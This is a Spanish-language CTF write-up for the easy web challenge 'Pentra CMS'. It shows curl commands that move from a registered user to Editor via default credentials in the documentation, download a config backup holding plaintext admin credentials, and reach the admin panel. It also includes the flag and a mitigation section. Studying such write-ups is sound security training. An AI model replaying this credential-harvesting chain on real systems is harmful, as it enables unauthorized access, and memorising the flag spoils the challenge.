---
tipo: laboratorio
tags: [ctf, pentraze, web, easy]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Easy"
Estado: "Completado"
Puntos: "25"
Flag: "PENTRAZE{55a4695fd6b1d4c56cdd0d562e0c828f2eccb0e30b0f3b1a87acc7598078e57e}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Easy|Easy]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 25

# Writeup - Pentra CMS

> [!info] Objetivo
> Obtener la flag explotando las debilidades de PentraCMS.

- **Target:** `http://34.135.253.132:33226`
- **Autor:** Br0nco
- **Tecnología observada:** Apache/2.4.68 y PHP/8.2.33

## Resumen rápido de la cadena de ataque

1. Se registra una cuenta pública con rol `user`.
2. La documentación accesible para usuarios normales revela credenciales por defecto del Editor.
3. El Editor accede a `backup.zip` mediante el gestor de archivos.
4. El backup contiene una configuración con credenciales administrativas en texto plano.
5. Se inicia sesión como `administrator` y se visita `admin.php` para leer la flag.

## Vulnerabilidades explotadas

- **Registro público sin privilegios** que permite entrar en la superficie de usuario.
- **Credenciales por defecto expuestas** en `documentation.php`.
- **Acceso excesivo a archivos:** el Editor podía descargar un backup de configuración.
- **Exposición de secretos en texto plano:** el backup incluía la contraseña del administrador.
- **Escalada de privilegios** por reutilización de credenciales administrativas en claro.
- **Autorización insuficiente** en el gestor de archivos y en el panel administrativo.

## Paso a paso técnico

### 1. Reconocimiento y registro

La raíz redirigió al login:

```http
GET /
→ 302 Found
Location: login.php
```

El servidor reveló:

```http
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.2.33
```

Se utilizó `register.php` para crear una cuenta de prueba:

```bash
curl -s -c user-cookies.txt -X POST \
  "http://34.135.253.132:33226/register.php" \
  --data-urlencode 'username=auditor123' \
  --data-urlencode 'password=Auditoria2026!'
```

La cuenta creada fue:

```text
Usuario: auditor123
Contraseña: Auditoria2026!
```

Después de autenticarse, el dashboard mostró:

```text
role: user
```

### 2. Documentación y credenciales del Editor

La opción visible para el usuario normal era `Documentación`, que apunta a `documentation.php`. Allí aparecía:

```text
username: editor
password: PentraCMS2024!
role: Editor
```

Estas credenciales eran el primer salto de privilegios. No fue necesario probar [[SQL Injection]] ni romper un hash.

### 3. Acceso al gestor de archivos

Al iniciar sesión como `editor` apareció el enlace:

```text
/filemanager.php
```

El gestor exponía `backup.zip` y su descarga:

```text
/download.php?file=backup.zip
```

Descarga reproducible:

```bash
BASE="http://34.135.253.132:33226"

curl -s -c editor-cookies.txt \
  -b editor-cookies.txt \
  -X POST "$BASE/login.php" \
  --data-urlencode 'username=editor' \
  --data-urlencode 'password=PentraCMS2024!'

curl -s -b editor-cookies.txt \
  "$BASE/download.php?file=backup.zip" \
  -o backup.zip

file backup.zip
unzip -l backup.zip
```

El archivo contenía `config_backup.txt`:

```bash
unzip -p backup.zip config_backup.txt
```

### 4. Credenciales administrativas

La configuración extraída incluía:

```ini
[database]
host=localhost
port=3306
name=pentracms_db
user=cms_user
pass=db_pass_2024

[admin]
admin_user=administrator
admin_pass=Sup3rS3cur3P4ss!
```

También aparecían credenciales SMTP, pero los datos que cambiaron el control del reto fueron los de la sección `[admin]`. Este es un ejemplo de **secret sprawl**: el mismo backup mezclaba secretos de base de datos, correo y administración.

### 5. Escalada y flag

Se inició sesión con `administrator` / `Sup3rS3cur3P4ss!` y se verificó `role: admin`. El panel `admin.php` respondió `HTTP/1.1 200 OK` y mostró la sección `Flag del Sistema`:

```bash
curl -i -b admin-cookies.txt \
  "http://34.135.253.132:33226/admin.php"
```

## Flag

```text
PENTRAZE{55a4695fd6b1d4c56cdd0d562e0c828f2eccb0e30b0f3b1a87acc7598078e57e}
```

## Lecciones aprendidas y mitigar

- La documentación pública no debe incluir contraseñas operativas, ni siquiera credenciales por defecto que sigan activas.
- El registro debe ser seguro por diseño, pero un usuario normal no debería poder descargar backups de configuración.
- Los archivos de backup deben eliminarse del despliegue o guardarse en un almacén cifrado con control de acceso separado.
- Los secretos deben residir en un secret manager o en variables de entorno, no en texto plano dentro de un ZIP descargable.
- La autorización debe comprobarse por rol y por objeto en el servidor, no confiar en que el Editor no conozca la URL.
- Conviene rotar las credenciales expuestas, invalidar las contraseñas por defecto y monitorizar accesos a archivos de backup.
- Los hashes de contraseñas deben generarse con un KDF resistente; guardar contraseñas en claro elimina incluso la protección de [[Password Hashing]].

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - VaultBridge|VaultBridge]]
- ➡️ Siguiente: [[Writeup - SoftDat Technology|SoftDat Technology]]

## Relacionadas

- [[Authentication]] — credenciales por defecto, sesiones y control de acceso.
- [[Information Disclosure]] — backups y documentación que revelaron secretos.
- [[Privilege Escalation]] — transición de `user` a `Editor` y después a `admin`.
